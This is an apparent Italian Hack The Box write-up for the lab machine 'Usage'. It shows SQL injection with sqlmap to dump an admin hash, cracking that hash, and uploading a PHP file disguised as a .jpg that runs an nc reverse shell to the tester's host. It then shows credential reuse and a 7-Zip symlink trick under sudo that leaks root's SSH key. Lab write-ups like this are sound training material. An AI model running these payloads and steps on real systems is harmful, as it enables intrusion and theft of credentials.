**TARGET: 10.10.11.18

# INFORMATION GATHERING

Iniziamo con un rapido scan di [Nmap](Note/Tool/Nmap.md)

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sSVC 10.10.11.18
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 22:49 CEST
Nmap scan report for usage.htb (10.10.11.18)
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Daily Blogs
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
```

abbiamo 2 porte aperte:

- 22 ssh OpenSSH 8.9p1
- 80 http nginx 1.18.0

Un ulteriore scan su tutte le porte non ci da nessuna nuova informazione.

# ENUMERATION

Visitando l'indirizzo `10.10.11.18:80` ci troviamo davanti a un form di login con diverse pagine:

- Login (usage.htb/login) la pagine iniziale
- Register (http://usage.htb/registration) dove ci chiede una classica registrazione
- Admin (http://admin.usage.htb) form di accesso per l'utente adim

![](../zzz_rev/attachments/usage.png)

nella pagina `/login` abbiamo anche un link ad un rest password che rimanda a questa pagina 

![](../zzz_rev/attachments/usage2.png)
Dopo diversi tentativi proviamo ad utilizzare [Sqlmap](Note/Tool/Sqlmap.md) per vedere se troviamo qualche SQLinjection nell pagina `/http://usage.htb/forget-password`.

Intercettiamo la richiesta con [Burp Suite](Note/Tool/Burp%20Suite.md) ci salviamo la richiesta e la diamo un pasto a [Sqlmap](Note/Tool/Sqlmap.md). 
Dopo vari tentativi Sqlmap ci trova un sql-injection e riusciamo ad estrarre un hash dal database

```bash
┌──(kali㉿kali)-[~/…/share/sqlmap/output/usage.htb]
└─$ sqlmap -r request.txt -p email --batch --level 5 --risk 3 -D usage_blog --tables -T admin_users -threads 10 --dump

...<snip>...
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2024-07-08 17:49:03 | EgiLfkUc3evFcQ4gQcESVLAUjTsS7zqZ9pdWSwWPMmNVL6vFnj1tEb0Lzfah |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
...<snip>...
```


- **`-r request.txt`**
    
    - Questo parametro indica a `sqlmap` di utilizzare un file di richiesta HTTP (in formato raw) chiamato `request.txt`. Questo file dovrebbe contenere la richiesta HTTP che si desidera testare per le vulnerabilità SQL injection.
- **`-p email`**
    
    - Specifica il parametro da testare per l'iniezione SQL. In questo caso, `email` è il nome del parametro che verrà analizzato per le vulnerabilità SQL.
- **`--batch`**
    
    - Questo parametro indica a `sqlmap` di eseguire l'operazione in modalità automatica, evitando richieste di conferma da parte dell'utente. È utile per eseguire script in batch senza interazione manuale.
- **`--level 5`**
    
    - Imposta il livello di approfondimento dei test di vulnerabilità. `sqlmap` offre livelli da 1 a 5; un livello più alto significa che `sqlmap` eseguirà test più completi e complessi, ma richiederà più tempo. Un livello di 5 è molto approfondito e testerebbe diversi tipi di iniezione.
- **`--risk 3`**
    
    - Questo parametro imposta il livello di rischio per l'esecuzione delle tecniche di attacco. I valori vanno da 0 a 3, dove 0 è il livello più sicuro e 3 il più rischioso. Un rischio di 3 consente l'uso di tecniche più aggressive che possono comportare effetti collaterali o un carico maggiore sul server target.
- **`-D usage_blog`**
    
    - Specifica il nome del database da esaminare. In questo caso, `usage_blog` è il nome del database dal quale `sqlmap`cercherà di estrarre informazioni.
- **`--tables`**
    
    - Indica a `sqlmap` di elencare tutte le tabelle nel database specificato (`usage_blog`). Questo è un passo preparatorio per accedere ai dati all'interno di queste tabelle.
- **`-T admin_users`**
    
    - Specifica il nome della tabella da cui si desidera estrarre i dati. In questo caso, `admin_users` è la tabella di interesse.
- **`-threads 10`**
    
    - Imposta il numero di thread per le operazioni di attacco. L'uso di thread multipli può velocizzare il processo di test. In questo caso, `sqlmap` utilizzerà 10 thread.
- **`--dump`**
    
    - Questo parametro indica a `sqlmap` di estrarre i dati dalla tabella specificata (`admin_users`). In pratica, `sqlmap`tenterà di recuperare tutte le righe di dati presenti in quella tabella.

Utilizziamo [John The Ripple](Note/Tool/John%20The%20Ripple.md) per forzare l'hash

```bash
┌──(kali㉿kali)-[~/htb/usage]
└─$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)
1g 0:00:00:14 DONE (2024-07-18 13:17) 0.06711g/s 108.7p/s 108.7c/s 108.7C/s maggie1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Bene ora che abbiamo una password proviamo a loggarci sulla pagina `admin.usage.htb`

![](../zzz_rev/attachments/usage3.png)

# GAINING AN INITIAL FOOTHOLD

Ispezionando le vari pagine ci troviamo in `http://admin.usage.htb/admin/auth/setting`
dove abbiamo la possibilità di caricare un immagine profilo per l'account. Potrebbe essere un buon punto per caricare un nostro file malevolo. 

Analizzando le informazione della dashboard abbiamo una versione di laravel 10.18.0 e cercando in internet troviamo riferimento a [questa ACE](https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096) (Arbitrary Code Execution) dove possiamo bypassare i filtri di controllo del server caricando una shellphp ma con estensione .jpg e modificando la richiesta con burp per ottenere l'esecuzione della shell.

per prima cosa ci prepariamo il nostro file `.jpg` che non è altro che una shell php salvata con estensione .jpg

```bash
┌──(kali㉿kali)-[~/htb/usage]
└─$ cat revers.jpg
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.49 443 >/tmp/f"); ?>
```

e prepariamo nc in ascolto 

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
```

Carichiamo il nostro payload nella pagina e intercettiamo la richiesta con [Burp Suite](Note/Tool/Burp%20Suite.md)
![](../zzz_rev/attachments/usage4.png)
 modifichiamo l'estensione del file aggiungendo `.php`

![](../zzz_rev/attachments/usage5.png)
procediamo con il validare la richiesta e otteniamo la nostra shell

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.18] 49160
/bin/sh: 0: can't access tty; job control turned off
$ whoami
dash
$
```

facciamo upgrade della shell

```bash
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z
zsh: suspended  nc -lnvp 443

┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 443

<ject_admin/public/uploads/images$ export SHELL=bash
<n/public/uploads/images$ export TERM=xterm-256color
dash@usage:/var/www/html/project_admin/public/uploads/images$
```

e ci prendiamo la nostra user flag

```bash
dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/user.txt
092f18e4a17e0db57b278daf1591c13a
```

# LATERAL MOVIMENT

Nella directory `/home` abbiamo la home anche di un altro utente `xander` che potrebbe avere piu privilegi di noi e consentici di diventare root.

Esplorando la home di `dash` troviamo questo file `.monitrc` diamogli un occhiata.

```bash
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
dash@usage:~$
```

sembra contenere delle credenziali proviamo ad utilizzarle per l'utente `xander`

```bash
dash@usage:/home$ su xander
Password:
xander@usage:/home$
```

# PRIVESC

Proviamo a vedere se `xander` puo eseguire qualcosa come root

```bash
xander@usage:/home$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

andiamo a vedere cons fa `usage_management`

```bsah
xander@usage:/home$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 54873309

Scanning the drive:
2984 folders, 17948 files, 113879412 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20932


Files read from disk: 17948
Archive size: 54873361 bytes (53 MiB)
Everything is Ok

```

Scegliendo l'opzione 1 viene avviato 7-Zip per aggiornare l'archivio ZIP di backup del progetto situato in `/var/backups/project.zip`, Questo scansiona i file e le cartelle sul disco, e comprimendo gli elementi aggiornati o nuovi nell'archivio ZIP.

Ora [qui](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------) troviamo un modo per utilizzare 7z per leggere dei file a cui normalmente non abbiamo accesso. con ad esempio un `id_rsa` privata dell'utente root.

Ora seguendo quello che abbiamo letto creiamo un file vuoto chiamato `@id_rsa`  che è la chiave id_rsa di root.

```bash
xander@usage:/var/www/html$ touch @id_rsa
```

Ora creiamo un collegamento simbolico che punta al file che vogliamo leggere.

```bash
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa
```

eseguiamo il programma 

```
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 54874373

Scanning the drive:

WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17947 files, 113879379 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20931


Files read from disk: 17947
Archive size: 54874373 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7
```

Quello che succede è che poiché il contenuto di `/root/.ssh/id_rsa` non è una lista di file, `7za` genera un errore. Ma nel processo di generazione dell'errore, mostra il contenuto del file che ha letto, rivelandolo.

Non ci resta che copiarlo, dargli i permessi d' esecuzione e collegarci in ssh 

```bash
┌──(kali㉿kali)-[~/htb/usage]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
┌──(kali㉿kali)-[~/htb/usage]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/htb/usage]
└─$ ssh root@10.10.11.18 -i id_rsa
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Fri Jul 19 03:28:00 PM UTC 2024

  System load:           0.0
  Usage of /:            67.7% of 6.53GB
  Memory usage:          40%
  Swap usage:            0%
  Processes:             239
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.18
  IPv6 address for eth0: dead:beef::250:56ff:fe94:e2c0


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 17 21:58:45 2024 from 10.10.14.49
root@usage:~
```

E ci prendiamo la nostra root flag

```bash
root@usage:~# cat /root/root.txt
56d0b7e92ecbacd1404935d76d0317c3
root@usage:~#
```
